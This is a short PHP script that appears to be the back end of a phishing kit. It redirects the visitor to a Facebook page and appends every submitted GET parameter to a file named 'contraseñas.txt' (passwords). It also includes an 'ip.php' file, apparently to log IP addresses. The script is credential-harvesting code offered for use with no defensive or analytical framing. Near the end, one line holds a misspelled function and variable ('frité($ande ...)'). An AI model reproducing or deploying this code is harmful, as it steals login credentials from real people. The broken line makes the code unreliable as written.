 <?php

include "ip.php";

header("Location: https://m.facebook.com/RealHackRWAM/ ");
$handle = fopen("contraseñas.txt", "a"); 

foreach($_GET as $variable => $value) {
	fwrite($handle, $variable);

	fwrite($handle, "=");

	fwrite($handle, $value);

	fwrite($handle, "\r\n");
}


frité($ande, "\r\n");
fclose($handle);

exit
?>


